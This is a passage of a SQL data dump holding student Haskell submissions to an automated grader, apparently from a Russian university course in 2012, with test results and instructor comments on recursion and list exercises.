(333, 20, 'B@rmaley.exe', '2012-09-12 19:47:54', 1, 'sumfact n = sum $ map (k -> product $ [1..fromIntegral k]) [1..n]\r\n', '<br/>Тесты успешно пройдены!'),
(334, 19, '3742311', '2012-09-12 19:48:06', 0, 'sumn = if n == 0 then 0 else sumn(n - 1) + n\r\n   --- параметр слева пропущен...\r\nsumsinn n = if n == 0 then 0 else sumsinn(n - 1) + sin(n)\r\nsumsin n = sin(sumn(n)) / sumsinn(n)', 'Не удалось вычислить выражение "sumsin 1", проверьте правильность синтаксиса'),
(335, 19, '3742311', '2012-09-12 19:50:24', 0, 'let sumn = if n == 0 then 0 else sumn(n - 1) + n\r\nlet sumsinn n = if n == 0 then 0 else sumsinn(n - 1) + sin(n)\r\nsumsin n = sin(sumn(n)) / sumsinn(n)', 'Не удалось вычислить выражение "sumsin 1", проверьте правильность синтаксиса'),
(336, 19, '3742311', '2012-09-12 19:51:37', 1, 'sumn n = if n == 0 then 0 else sumn(n - 1) + n\r\nsumsinn n = if n == 0 then 0 else sumsinn(n - 1) + sin(n)\r\nsumsin n = sin(sumn(n)) / sumsinn(n)\r\n  --- ОК, засчитано - но это, понятно, не хвостовая рекурсия\r\n  --- Еще во многих местах скобки можно не писать, например  sumsin n = sin(sumn n) / sumsinn n', '<br/>Тесты успешно пройдены!'),
(337, 23, '517309', '2012-09-12 19:52:16', 3, 'coprime a b =\r\n	if a == 0 then b == 1\r\n	else coprime (b `mod` a) a\r\n\r\ncount curList res min rem \r\n	| rem == 0 = 1\r\n	| min > rem = res\r\n	| otherwise =\r\n		let simple = count curList res (min + 1) rem in\r\n		if not $ all (coprime min) curList then simple\r\n		else simple + count (min : curList) res (min + 1) (rem - min)\r\n\r\nc n = count [] 0 1 n', '<br/>Тесты успешно пройдены!'),
(338, 24, '318210', '2012-09-12 20:03:19', 1, 'b :: Double -> Double\r\nb2 :: Double -> Double -> Double\r\nb 0 = 0\r\nb n = b2 n n\r\nb2 n k | n == 1 = 1 / k\r\n	| n > 1 = b2 (n - 1) ( n - 1 + 1/k)', '<br/>Тесты успешно пройдены!'),
(339, 18, '4837959', '2012-09-12 20:05:44', 2, '--- пустой файл..', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(340, 18, '4837959', '2012-09-12 20:32:02', 1, 'f 0 = 1\r\nf n = 1 + 1 / f(n - 1)', '<br/>Тесты успешно пройдены!'),
(341, 22, '3742311', '2012-09-12 20:32:04', 0, 'isprimetmp (d, n) = if d == 1 then True else if (mod n d) == 0 then False else isprimetmp((d - 1,n))\r\nisprime n = isprimetmp(n - 1, n)\r\ngtmp (d, n) = if d*2 >= n then False else if (isprime (d) && isprime (n - d)) then True else gtmp ((d + 1, n))\r\ng n = gtmp ((2, n))', '<br/>Тесты успешно пройдены!'),
(342, 22, '318210', '2012-09-12 21:26:14', 0, 'isSumPrime :: Integer -> Bool\r\nisSumPrime2 :: Integer->Integer->Bool\r\nisPrime1 :: Integer -> Bool\r\nisPrime2 :: Integer ->Integer->Bool\r\nisPrime1 p | p <=0 = False\r\n	|otherwise = isPrime2 2 p\r\nisPrime2 d p | d * d > p = True\r\n	|p  `mod` d == 0 = False\r\n	|otherwise = isPrime2 (d + 1) p\r\nisSumPrime n = isSumPrime2 2 n\r\nisSumPrime2 k n    | k + 1 >= n = False\r\n		| isPrime1(k) == True &&  isPrime1(n - k) == True && k /= n - k = \r\n				True\r\n		|otherwise = isSumPrime2 (k + 1) n ', 'Не удалось вычислить выражение "g 6", проверьте правильность синтаксиса'),
(343, 22, '318210', '2012-09-12 21:28:11', 1, 'g :: Integer -> Bool\r\nisSumPrime2 :: Integer->Integer->Bool\r\nisPrime1 :: Integer -> Bool\r\nisPrime2 :: Integer ->Integer->Bool\r\nisPrime1 p | p <=0 = False\r\n	|otherwise = isPrime2 2 p\r\nisPrime2 d p | d * d > p = True\r\n	|p  `mod` d == 0 = False\r\n	|otherwise = isPrime2 (d + 1) p\r\n             --- Просто как замечание, всегда, кроме самого первого раза, можно смело увеличивать d на 2 )\r\ng n = isSumPrime2 2 n\r\nisSumPrime2 k n    | k + 1 >= n = False\r\n		| isPrime1(k) == True &&  isPrime1(n - k) == True && k /= n - k = \r\n    --- Вместо isPrime1(k) == True &&  isPrime1(n - k) == True короче isPrime1(k) && isPrime1(n - k)\r\n				True\r\n		|otherwise = isSumPrime2 (k + 1) n ', '<br/>Тесты успешно пройдены!'),
(344, 23, '3742311', '2012-09-12 22:13:41', 0, 'coprimetmp d a b = if (d > a) || (d > b) then True else if (mod a d) == 0 && (mod b d) == 0 then False else (coprimetmp (d + 1) a b)\r\ncoprime a b = (coprimetmp 2 a b)\r\ncoprimeforarray n a = if a == [] then True else if (coprime n (head a)) then (coprimeforarray n (tail a)) else False\r\nftmp n min a = if n == 0 then 1 else if n < min then 0 else if (coprimeforarray min a) then (ftmp (n - min) (min + 1) (min:a)) + (ftmp n (min + 1) a) else (ftmp n (min + 1) a)\r\nf n = (ftmp n 1 [])\r\n', 'Не удалось вычислить выражение "c 10", проверьте правильность синтаксиса'),
(345, 23, '3742311', '2012-09-12 22:14:55', 1, 'coprimetmp d a b = if (d > a) || (d > b) then True else if (mod a d) == 0 && (mod b d) == 0 then False else (coprimetmp (d + 1) a b)\r\ncoprime a b = (coprimetmp 2 a b)\r\ncoprimeforarray n a = if a == [] then True else if (coprime n (head a)) then (coprimeforarray n (tail a)) else False\r\nctmp n min a = if n == 0 then 1 else if n < min then 0 else if (coprimeforarray min a) then (ctmp (n - min) (min + 1) (min:a)) + (ctmp n (min + 1) a) else (ctmp n (min + 1) a)\r\nc n = (ctmp n 1 [])', '<br/>Тесты успешно пройдены!'),
(346, 22, '3742311', '2012-09-12 22:17:50', 1, 'isprimetmp d n = if d == 1 then True else if (mod n d) == 0 then False else (isprimetmp (d - 1) n)\r\nisprime n = (isprimetmp (n - 1) n)\r\ngtmp d n = if d*2 >= n then False else if (isprime d) && (isprime (n - d)) then True else (gtmp (d + 1) n)\r\ng n = (gtmp 2 n)', '<br/>Тесты успешно пройдены!'),
(347, 18, '1705225', '2012-09-12 22:54:04', 1, 'f 0 = 1\r\nf n = 1 + 1/f(n - 1)', '<br/>Тесты успешно пройдены!'),
(348, 24, '1705225', '2012-09-12 22:54:33', 1, 'func x 0 = x\r\nfunc x n = x + 1/(func (x+1) (n-1))\r\n    --- скобки вокруг func тут не нужны\r\nb n = func 0 n', '<br/>Тесты успешно пройдены!'),
(349, 19, '1705225', '2012-09-12 22:55:07', 1, 'func x y 0 = sin x/y\r\nfunc x y n = func (x + n) (y + sin n) (n-1) \r\nsumsin n = func 0 0 n', '<br/>Тесты успешно пройдены!'),
(350, 20, '1705225', '2012-09-12 22:55:26', 1, 'fact 0 = 1\r\nfact x = x * fact (x-1)\r\nsumfact 0 = 0\r\nsumfact x = fact x + sumfact (x-1)\r\n   --- OK, но это, понятно, не хвостовая рекурсия', '<br/>Тесты успешно пройдены!'),
(351, 21, '517309', '2012-09-13 04:04:46', 2, 'module Solution where\r\n\r\n--пятая задача\r\nnseq n = nseqdown n (upb n)\r\n\r\nnseqdown _ 0 = 0\r\nnseqdown _ 1 = 1\r\nnseqdown n 2 = (div (n-1) 2) + 1\r\nnseqdown sz pt\r\n	 	| pt > ub = nseqdown sz ub\r\n		| otherwise = (nseqdown (sz - lwb pt + 1) pt) + nseqdown sz (pt-1)\r\n		where ub = upb sz\r\n\r\n\r\n--нижняя граница чисел, разбиваемых на n\r\nlwb n = div (n*(n+1)) 2\r\n\r\n--верхняя граница для частей разбиения n\r\nupb n = uppb n 1\r\nuppb n m \r\n	| m > n = m - 1\r\n	| otherwise = uppb (n-m) (m+1)\r\n\r\n\r\n\r\n--вторая задача\r\nfunc n = accfunc n 0\r\n\r\naccfunc 0 n = 1/n\r\naccfunc m n \r\n		| n /= 0 = accfunc (m-1) (m+1/n)\r\n		| otherwise = accfunc (m-1) m\r\n', 'Выражение имеет неправильное значение: nseq 9'),
(352, 24, '63706456', '2012-09-13 05:10:16', 1, 'b n = accfunc n 0\r\n\r\naccfunc 0 n = 1/n\r\naccfunc m n \r\n		| n /= 0 = accfunc (m-1) (m+1/n)\r\n		| otherwise = accfunc (m-1) m', '<br/>Тесты успешно пройдены!'),
(353, 21, '63706456', '2012-09-13 05:42:11', 1, 'nseq n = nseqdown n (upb n)\r\n--без повторений\r\nnseqdown _ 0 = 0\r\nnseqdown _ 1 = 1\r\nnseqdown n 2 = (div (n-1) 2) + 1\r\nnseqdown sz pt\r\n	 	| pt > ub = nseqdown sz ub\r\n		| otherwise = (seqonadd (sz - lwb pt + 1) pt) + nseqdown sz (pt-1)\r\n		where ub = upb sz\r\n--с повторениями\r\nseqonadd _ 0 = 0\r\nseqonadd _ 1 = 1\r\nseqonadd n 2 = (div n 2) + 1\r\nseqonadd sz pt\r\n	 	| pt > ub = seqonadd sz ub\r\n		| otherwise = (seqonadd (sz - lwb pt + 1) pt) + seqonadd sz (pt-1)\r\n		where ub = upb sz\r\n\r\n--нижняя граница чисел, разбиваемых на n\r\nlwb n = div (n*(n+1)) 2\r\n\r\n--верхняя граница для частей разбиения n\r\nupb n = uppb n 1\r\nuppb n m \r\n	| m > n = m - 1\r\n	| otherwise = uppb (n-m) (m+1)', '<br/>Тесты успешно пройдены!'),
(354, 21, '472848', '2012-09-13 06:02:29', 0, 'f n k = if (n > k) then (f n (k + 1) + f (n - k) (k + 1)) \r\nelse if (n == k) then 1 else 0\r\nb n = f n 1', 'Не удалось вычислить выражение "nseq 1", проверьте правильность синтаксиса'),
(355, 21, '472848', '2012-09-13 06:03:19', 1, 'f n k = if (n > k) then (f n (k + 1) + f (n - k) (k + 1)) \r\nelse if (n == k) then 1 else 0\r\nnseq n = f n 1', '<br/>Тесты успешно пройдены!'),
(356, 21, '3742311', '2012-09-13 07:20:29', 1, 'nseqtmp n min = if n == 0 then 1 else if n < min then 0 else (nseqtmp (n - min) (min + 1)) + (nseqtmp n (min + 1))\r\nnseq n = (nseqtmp n 1)', '<br/>Тесты успешно пройдены!'),
(357, 24, '3742311', '2012-09-13 07:25:36', 1, 'btmp l r = if l == 0 then (1 / r) else (btmp (l - 1) (l + 1 / r))\r\nb n = (btmp (n - 1) n)\r\n   --- тут внешние скобки лишние, и в первом правиле тоже', '<br/>Тесты успешно пройдены!'),
(358, 21, '442421', '2012-09-13 07:53:30', 1, 'nseq n = 1 + nseq1 0 n\r\n\r\nnseq1 a n = \r\n	if mod n 2 == 0 then \r\n		forLoop (a+1) ((div n 2)-1) n 0 \r\n	else \r\n		forLoop (a+1) (div n 2) n 0\r\n\r\n\r\nforLoop i ub n r = \r\n	if i<=ub then \r\n		forLoop (i+1) ub n (r+1+nseq1 i (n-i))\r\n	else \r\n		r\r\n ', '<br/>Тесты успешно пройдены!'),
(359, 24, '4837959', '2012-09-13 07:55:45', 1, 'b n = bb n n\r\nbb 0 p = p\r\nbb n p = bb(n - 1)(n - 1 + 1 / p)', '<br/>Тесты успешно пройдены!'),
(360, 19, '4837959', '2012-09-13 07:56:57', 1, 'sumsin n = sumsin1 n 0 0\r\nsumsin1 0 num denom = sin(num) / denom\r\nsumsin1 n num denom = sumsin1(n - 1)(n + num)(sin n + denom)', '<br/>Тесты успешно пройдены!'),
(361, 20, '4837959', '2012-09-13 07:57:45', 1, '-- f n = 1! + 2! + ... + n! = 1 * (1 + 2 * (1 + 3 * (1 + ... + (n - 1) * (1 + n)))\r\nsumfact n = sumfact1 n 1\r\nsumfact1 1 sum = sum\r\nsumfact1 n sum = sumfact1(n - 1)(1 + n * sum)', '<br/>Тесты успешно пройдены!'),
(362, 21, '4837959', '2012-09-13 07:58:55', 0, 'nseq n = nseq1 n 1\r\nnseq1 0 start = 1\r\nnseq1 n start = if start > n then 0\r\n                else iter(n - start + 1) n start 0\r\niter 0 n start sum = sum\r\niter i n start sum = iter(i - 1) n start (sum + nseq1(n - start - i + 1)(start + i))', '<br/>Тесты успешно пройдены!'),
(363, 22, 'tonyo', '2012-09-13 08:00:43', 1, 'isprime1 n m\r\n        | m == 1+floor (sqrt (fromIntegral n)) = True\r\n              --- я бы тут написал условие m*m >= n (умножать, конечно, гораздо быстрее, чем извлекать квадратный корень..)\r\n        | mod n m == 0 = False\r\n        | otherwise = isprime1 n (m+1)\r\n\r\nisprime n = isprime1 n 2\r\n\r\ng1 n minp\r\n        | minp == div n 2 = False\r\n        | isprime minp && isprime (n - minp) = True\r\n        | otherwise = g1 n (minp+1)\r\n\r\ng n = g1 n 2\r\n', 'Хитрый тест номер 4 не пройден :(<br/>Подсказка: 1 - это не простое число'),
(364, 19, '374969', '2012-09-13 09:26:12', 1, 'sumsinh 0 sumh = sumh\r\nsumsinh n sumh = sumsinh (n-1) (sumh + sin n)\r\n\r\nsumsin n = sin (n*(n+1)/2) / sumsinh n 0', '<br/>Тесты успешно пройдены!'),
(365, 20, '374969', '2012-09-13 09:36:12', 0, 'sumfacth i fact res max= if (i==max) then res else sumfacth (i+1) (fact*i) (res + fact*i) max\r\nsumfact n = sumfacth 1 1 0 n', 'Выражение имеет неправильное значение: sumfact 1'),
(366, 20, '374969', '2012-09-13 09:38:56', 1, 'sumfacth i fact res max= if (i>max) then res else sumfacth (i+1) (fact*i) (res + fact*i) max\r\nsumfact n = sumfacth 1 1 0 n', '<br/>Тесты успешно пройдены!'),
(367, 21, '4837959', '2012-09-13 09:44:06', 1, 'nseq n = nseq1 n 1\r\nnseq1 0 start = 1\r\nnseq1 n start = if start > n then 0\r\n                else iter(n - start + 1)(n - start)(start + 1) 0\r\niter 0 n start sum = sum\r\niter i n start sum = iter(i - 1)(n - 1)(start + 1)(sum + nseq1 n start)', '<br/>Тесты успешно пройдены!'),
(368, 21, '374969', '2012-09-13 10:10:22', 1, 'nseqh min sum = if (min > sum) then 0 else if (min == sum) then 1 else nseqh (min + 1) sum + nseqh (min + 1) (sum - min)\r\nnseq n = nseqh 1 n\r\n   --- OK, все правильно, но только вы уже послали позже крайнего срока - начала пары, 13:40. Засчитано, но вы пожалуйста посылайте строго до начала пары, в следуюзий раз я не засчитаю..', '<br/>Тесты успешно пройдены!'),
(369, 19, '318210', '2012-09-13 12:13:33', 2, 'sumsin :: Float->Float\r\nsinus :: Float->Float\r\nsinsum :: Float->Float\r\nsinsum2 :: Float->Float->Float->Float\r\n\r\nsumsin n = sinus n / sinsum n \r\n\r\nsinus n = sin (n * (n + 1) / 2)\r\n\r\nsinsum n = sinsum2 n 1 0\r\nsinsum2 n k s | k == n = (s + sin n)\r\n	     | k < n = sinsum2 n (k+1) (sin k + s)\r\n  --- OK, все правильно, но только вы послали существенно поэже срока сдачи (13:40). Дававайте так, я вам засчитаю\r\n  --- задачи за 50% - те вот эту не засчитаю, а 1.4 - засчтаю. Но в следующир раз обе не засчтаю, посылайте, \r\n  --- пожалуйста, решения строго до 13:40\r\n', '<br/>Тесты успешно пройдены!'),
(370, 20, '318210', '2012-09-13 12:48:16', 1, 'sumfact :: Integer->Integer\r\nsumfact2 :: Integer-> Integer->Integer\r\n\r\nsumfact n = sumfact2 n 1\r\nsumfact2 n res | n == 1 = res\r\n	|n > 0 = sumfact2 (n - 1) (res * n +  1)', '<br/>Тесты успешно пройдены!'),
(371, 25, '517309', '2012-09-13 14:09:12', 3, 'minlist xs = minimum xs', '<br/>Тесты успешно пройдены!'),
(372, 27, '517309', '2012-09-13 14:10:02', 3, 'minsum xs = minimum $ zipWith (+) xs (tail xs)', '<br/>Тесты успешно пройдены!'),
(373, 26, '517309', '2012-09-13 14:10:55', 3, 'rev = reverse', '<br/>Тесты успешно пройдены!'),
(374, 28, '517309', '2012-09-13 14:11:28', 0, 'check = any', 'Не удалось вычислить выражение "check (x->x>5) [3,2,7,4]", проверьте правильность синтаксиса');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(375, 28, '517309', '2012-09-13 14:14:08', 3, 'check = any', '<br/>Тесты успешно пройдены!'),
(376, 29, '517309', '2012-09-13 14:15:38', 0, 'checkDifferent [] = True\r\ncheckDifferent (x:xs) = !any (==x) xs && checkDifferent xs', 'Не удалось вычислить выражение "checkDifferent [3,2,7]", проверьте правильность синтаксиса'),
(377, 29, '517309', '2012-09-13 14:16:33', 0, 'checkDifferent [] = True\r\ncheckDifferent (x:xs) = \r\n   not any (==x) xs && checkDifferent xs', 'Не удалось вычислить выражение "checkDifferent [3,2,7]", проверьте правильность синтаксиса'),
(378, 29, '517309', '2012-09-13 14:17:28', 0, 'checkDifferent _ = True', 'Выражение имеет неправильное значение: checkDifferent [3,2,7,5,2,8]'),
(379, 29, '517309', '2012-09-13 14:20:12', 0, 'checkDifferent [] = True\r\ncheckDifferent (x:xs) = all (!=x) xs && checkDifferent xs', 'Не удалось вычислить выражение "checkDifferent [3,2,7]", проверьте правильность синтаксиса'),
(380, 29, '517309', '2012-09-13 14:21:24', 0, 'checkDifferent [] = True\r\ncheckDifferent (x:xs) = if not (all (!=x) xs) then False else checkDifferent xs', 'Не удалось вычислить выражение "checkDifferent [3,2,7]", проверьте правильность синтаксиса'),
(381, 29, '517309', '2012-09-13 14:21:44', 0, 'checkDifferent [] = True\r\ncheckDifferent (x:xs) = False', 'Выражение имеет неправильное значение: checkDifferent [3,2,7]'),
(382, 29, '517309', '2012-09-13 14:22:11', 0, 'checkDifferent [] = True\r\ncheckDifferent (x:xs) = all (/=x) xs', 'Выражение имеет неправильное значение: checkDifferent [3,2,7,5,2,8]'),
(383, 29, '517309', '2012-09-13 14:22:26', 0, 'checkDifferent [] = True\r\ncheckDifferent (x:xs) = all (/=x) xs && checkDifferent xs', '<br/>Тесты успешно пройдены!'),
(384, 29, '517309', '2012-09-13 14:22:52', 3, 'checkDifferent [] = True\r\ncheckDifferent (x:xs) = all (	 -> t/=x) xs && checkDifferent xs', '<br/>Тесты успешно пройдены!'),
(385, 25, '3742311', '2012-09-13 15:47:53', 0, 'minlisttmp [] m  = m\r\nminlisttmp (h:t) m = minlisttmp t h (min h m)\r\nminlist (h:t) = minlisttmp t h', 'Не удалось вычислить выражение "minlist [3,2,7]", проверьте правильность синтаксиса'),
(386, 25, '3742311', '2012-09-13 15:49:21', 0, 'minlisttmp [] m  = m\r\nminlisttmp l m = minlisttmp (tail l) (head l) (min (head l) m)\r\nminlist l = minlisttmp (tail l) (head l)', 'Не удалось вычислить выражение "minlist [3,2,7]", проверьте правильность синтаксиса'),
(387, 25, '3742311', '2012-09-13 15:50:56', 1, 'minlisttmp [] m  = m\r\nminlisttmp (h:t) m = minlisttmp t (min h m)\r\nminlist (h:t) = minlisttmp t h', '<br/>Тесты успешно пройдены!'),
(388, 27, '3742311', '2012-09-13 15:52:40', 1, 'minsumtmp [] _ m  = m\r\nminsumtmp (h:t) p m = minsumtmp t h (min (h + p) m)\r\nminsum (h1:h2:t) = minsumtmp t h2 (h1 + h2)', '<br/>Тесты успешно пройдены!'),
(389, 26, '3742311', '2012-09-13 15:54:10', 1, 'revtmp [] l = l\r\nrevtmp (h:t) l = revtmp t (h:l)\r\nrev l = revtmp l []', '<br/>Тесты успешно пройдены!'),
(390, 28, '3742311', '2012-09-13 15:56:08', 1, 'check _ [] = False\r\ncheck cond (h:t) = if cond h then True else check cond t', '<br/>Тесты успешно пройдены!'),
(391, 29, '3742311', '2012-09-13 15:58:46', 1, 'hasequ x [] = False\r\nhasequ x (h:t) = if x == h then True else hasequ x t\r\ncheckDifferent [] = True\r\ncheckDifferent (h:t) = if hasequ h t then False else checkDifferent t\r\n   --- Я бы немного не так написал, это мы в следующий раз обсудим. Но у вас совершенно правильно, конечно, очень хорошо.', '<br/>Тесты успешно пройдены!'),
(392, 25, '6774563', '2012-09-13 16:04:58', 1, 'minlist [a] = a\r\nminlist (h:t) = min h (minlist t)\r\n', '<br/>Тесты успешно пройдены!'),
(393, 26, '6774563', '2012-09-13 16:22:01', 1, 'rev [] = []\r\nrev (h:t) = revAcc t [h]\r\n\r\nrevAcc [] acc = acc\r\nrevAcc (h:t) acc = revAcc t (h:acc)\r\n', '<br/>Тесты успешно пройдены!'),
(394, 28, '6774563', '2012-09-13 16:28:47', 1, 'check cond [] = False\r\ncheck cond (x:xs) = (cond x) || check cond xs\r\n', '<br/>Тесты успешно пройдены!'),
(395, 22, 'tonyo', '2012-09-13 16:29:01', 1, 'isprime1 n m \r\n        | m*m>n = True\r\n        | mod n m == 0 = False\r\n        | otherwise = isprime1 n (m+1)\r\n\r\nisprime n = isprime1 n 2 \r\n\r\ng1 n minp\r\n        | minp >= div (n+1) 2 = False\r\n        | isprime minp && isprime (n - minp) = True\r\n        | otherwise = g1 n (minp+1)\r\n\r\ng n = g1 n 2 \r\n', '<br/>Тесты успешно пройдены!'),
(396, 26, 'tonyo', '2012-09-13 16:29:54', 1, 'rev1 [] res = res\r\nrev1 (x:xs) res = rev1 xs (x:res)\r\n\r\nrev list = rev1 list []', '<br/>Тесты успешно пройдены!'),
(397, 29, '6774563', '2012-09-13 16:33:13', 1, 'checkDifferent [] = True\r\ncheckDifferent (x:xs) = all (e -> e /= x) xs && checkDifferent xs\r\n   --- Немного забегая вперед, можно all (/=x) xs\r\n   --- (это т.н. section)', '<br/>Тесты успешно пройдены!'),
(398, 25, '2562137', '2012-09-13 16:34:40', 1, 'minlist (x:xs) = f xs x\r\n\r\nf [] curr_min = curr_min\r\n\r\nf (x:xs) curr_min =\r\n	if x < curr_min\r\n	then f xs x\r\n	else f xs curr_min\r\n', '<br/>Тесты успешно пройдены!'),
(399, 27, '6774563', '2012-09-13 16:43:19', 0, 'minsum [] = 2000000000\r\nminsum [x] = 2000000000\r\nminsum (x:y:xs) = min (x+y) (minsum(y:xs))\r\n', '<br/>Тесты успешно пройдены!'),
(400, 28, '2562137', '2012-09-13 16:49:07', 1, 'check cond [] = False\r\ncheck cond (x:xs) = cond x || check cond xs\r\n', '<br/>Тесты успешно пройдены!'),
(401, 26, '2562137', '2012-09-13 16:49:22', 1, 'rev list = f list []\r\n\r\nf [] res = res\r\nf (x:xs) res = f xs (x:res)', '<br/>Тесты успешно пройдены!'),
(402, 29, '2562137', '2012-09-13 16:55:22', 1, 'checkDifferent [] = True\r\ncheckDifferent (x:xs) = notFound x xs && checkDifferent xs\r\n\r\nnotFound what [] = True\r\nnotFound what (x:xs) = (x /= what) && notFound what xs\r\n', '<br/>Тесты успешно пройдены!'),
(403, 25, 'tonyo', '2012-09-13 16:57:31', 1, 'minlist1 [] min = min\r\nminlist1 (x:xs) min =   if x < min\r\n                        then minlist1 xs x\r\n                        else minlist1 xs min\r\n   --- или можно minlist1 xs (if x < min then x else min)\r\n   --- Это то же самое, только запись короче\r\n\r\nminlist (x:xs) = minlist1 xs x\r\n', '<br/>Тесты успешно пройдены!'),
(404, 28, 'tonyo', '2012-09-13 17:03:22', 1, 'check _ [] = False\r\ncheck f (x:xs) =    if f x \r\n                    then True\r\n                    else check f xs\r\n', '<br/>Тесты успешно пройдены!'),
(405, 25, '44060', '2012-09-13 17:05:25', 0, 'minlist [] = 0\r\nminlist (x : xs) = lim x xs (100500) \r\nwhere 	\r\nlim x [] rezult = min x rezult\r\nlim x (y : xs) rezult = lim y xs (min y rezult)\r\n   --- Тут нужны отступы начиная с where и дальше всюду', 'Не удалось вычислить выражение "minlist [3,2,7]", проверьте правильность синтаксиса'),
(406, 29, 'tonyo', '2012-09-13 17:10:02', 1, 'contains [] _ = False\r\ncontains (x:xs) el = if x == el\r\n                     then True\r\n                     else contains xs el\r\n\r\ncheckDifferent [] = True\r\ncheckDifferent (x:xs) = if contains xs x\r\n                        then False\r\n                        else checkDifferent xs\r\n', '<br/>Тесты успешно пройдены!'),
(407, 27, '6774563', '2012-09-13 17:14:59', 1, '-- надеюсь, имеется ввиду минимальная сумма соседних элементов\r\n   --- Да, спасибо что обратили внимание! У меня было неправильное условие, сейчас исправил.\r\nminsum [] = 2000000000\r\nminsum [x] = 2000000000\r\nminsum (x:y:xs) = min (x+y) (minsum(y:xs))', '<br/>Тесты успешно пройдены!'),
(408, 27, '2562137', '2012-09-13 17:25:36', 1, 'minsum (x1:x2:xs) = f x2 xs (x1+x2)\r\n\r\nf x1 [] curr_min = curr_min\r\n\r\nf x1 (x2:xs) curr_min =\r\n	if x1+x2 < curr_min\r\n	then f x2 xs (x1+x2)\r\n	else f x2 xs curr_min\r\n', '<br/>Тесты успешно пройдены!'),
(409, 27, 'tonyo', '2012-09-13 17:26:23', 1, 'minsum1 [_] min = min \r\nminsum1 (y:x:xs) min = if sum > min \r\n                       then minsum1 (x:xs) min \r\n                       else minsum1 (x:xs) sum \r\n                            where sum = x+y \r\n\r\nminsum (y:x:xs) = minsum1 (x:xs) (x+y)\r\n', '<br/>Тесты успешно пройдены!'),
(410, 25, '397095', '2012-09-13 18:14:30', 1, 'minlist [x] = x\r\nminlist (x:xs) = minf x xs\r\n\r\nminf x [] = x\r\nminf x (y:ys) = if y < x then minf y ys else minf x ys', '<br/>Тесты успешно пройдены!'),
(411, 27, '397095', '2012-09-13 18:15:19', 1, 'minsum [x,y] = x + y\r\nminsum (x:y:xs) = minf (x+y) y xs\r\n\r\nminf s y [] = s\r\nminf s y (z:xs) = if (s < y+z) then minf s z xs else minf (z+y) z xs', '<br/>Тесты успешно пройдены!'),
(412, 26, '397095', '2012-09-13 18:15:40', 1, 'rev xs = rev2 xs []\r\nrev2 [] ys = ys\r\nrev2 (x:xs) ys = rev2 xs (x:ys)', '<br/>Тесты успешно пройдены!'),
(413, 28, '397095', '2012-09-13 18:16:05', 1, 'check f [] = False\r\ncheck f (x:xs) = if f x then True else check f xs', '<br/>Тесты успешно пройдены!'),
(414, 29, '397095', '2012-09-13 18:16:36', 1, 'checkDifferent [] = True\r\ncheckDifferent xs = df xs []\r\n\r\ndf [] _ = True\r\ndf (x:xs) ys = if contains x ys then False else df xs (x:ys)\r\n\r\ncontains x [] = False\r\ncontains x (y:ys) = if (x == y) then True else contains x ys', '<br/>Тесты успешно пройдены!'),
(415, 23, '83813', '2012-09-13 18:46:25', 1, 'gcd1 x y = if x == 0\r\n            then y\r\n            else gcd1 (y `mod` x) x\r\n\r\ngoodList l = if null l\r\n               then True\r\n               else goodList (tail l) && null [x | x<-tail l, head l == x || gcd1 (head l) x /= 1]\r\n   --- А зачем head l == x || gcd1 (head l) x /= 1 ? Вроде бы можно просто gcd1 (head l) x /= 1 \r\n\r\naddx x l = [x : il | il<-l]\r\n\r\nmergeLists nl = if null nl\r\n                  then []\r\n                  else head nl ++ mergeLists (tail nl)\r\n\r\nnseqInt s mx = if (s <= 0)\r\n                 then if s < 0\r\n                        then []\r\n                        else [[]]\r\n                 else mergeLists [l | l<-[addx x (nseqInt (s-x) x) | x<-[1..(mx - 1)]]]\r\nc n = length [l | l<-nseqInt n (n + 1), goodList l]\r\n   --- OK, хорошо, но вообще зря вы _выписываете_ все последовательности, надо же было просто их сосчитать, это все-же немного проще', '<br/>Тесты успешно пройдены!'),
(416, 25, '1730564', '2012-09-13 18:52:29', 1, 'minlist [] = error "empty list"\r\nminlist (head:tail) = minlist1 head tail\r\n\r\nminlist1 a [] = a\r\nminlist1 a (head:tail) = minlist1 (min a head) tail', '<br/>Тесты успешно пройдены!'),
(417, 26, '1730564', '2012-09-13 18:53:51', 1, 'rev [] = []\r\nrev a = rev1 a []\r\n\r\nrev1 [] a = a\r\nrev1 (head : tail) b = rev1 tail (head : b)', '<br/>Тесты успешно пройдены!'),
(418, 28, '1730564', '2012-09-13 18:54:15', 1, 'check :: (Integer -> Bool) -> [Integer] -> Bool\r\n  --- А почему мы решили, что параметр целый? На самом деле вашу замечательную функцию можно использовать \r\n  --- и для вещественных и для строк и т.д. Я ж говорю, тип лучше на писать, компилятор лучше ваш поймет,\r\n  --- какой тип вы написали.\r\ncheck a [] = False\r\ncheck a (head : tail) = a head || check a tail', '<br/>Тесты успешно пройдены!'),
(419, 29, '1730564', '2012-09-13 18:54:35', 1, 'checkDifferent [] = True\r\ncheckDifferent (head : tail) = checkDifferent tail && notContains head tail \r\n\r\nnotContains a [] = True\r\nnotContains a (head : tail) | a == head = False\r\n						    | otherwise = notContains a tail', '<br/>Тесты успешно пройдены!'),
(420, 27, '1730564', '2012-09-13 19:16:01', 1, 'minsum [] = 0\r\nminsum (h1 : h2 : tail) = minsum1  (h1 + h2) (h2 : tail)\r\n\r\nminsum1 a [] = a\r\nminsum1 a (head :[]) = a\r\nminsum1 a (h1 : h2 : tail) = minsum1 (min a (h1 + h2)) (h2 : tail) \r\n', '<br/>Тесты успешно пройдены!'),
(421, 25, 'erwert', '2012-09-13 22:21:35', 1, 'minlist (x:s) = minl x s\r\nminl m [] = m\r\nminl m (x:s) = minl (mm m x) s\r\nmm a b = if a > b then b else a', '<br/>Тесты успешно пройдены!'),
(422, 27, 'erwert', '2012-09-13 22:21:43', 1, 'minsum (x:y:s) = mins (x+y) (y:s)\r\nmins ms [_] = ms\r\nmins ms (x:y:ls) = if (x+y) < ms then mins (x+y) (y:ls) else mins ms (y:ls)', '<br/>Тесты успешно пройдены!'),
(423, 26, 'erwert', '2012-09-13 22:21:51', 1, 'rev [] = []\r\nrev (s:hs) = rev (hs) ++ [s]', '<br/>Тесты успешно пройдены!'),
(424, 25, '44060', '2012-09-13 23:35:58', 1, 'minlist [] = 0\r\nminlist (x : xs) = lim x xs (100500) 	\r\n	where 	\r\n		lim x [] rezult = min x rezult\r\n		lim x (y : xs) rezult = lim y xs (min y rezult)', '<br/>Тесты успешно пройдены!'),
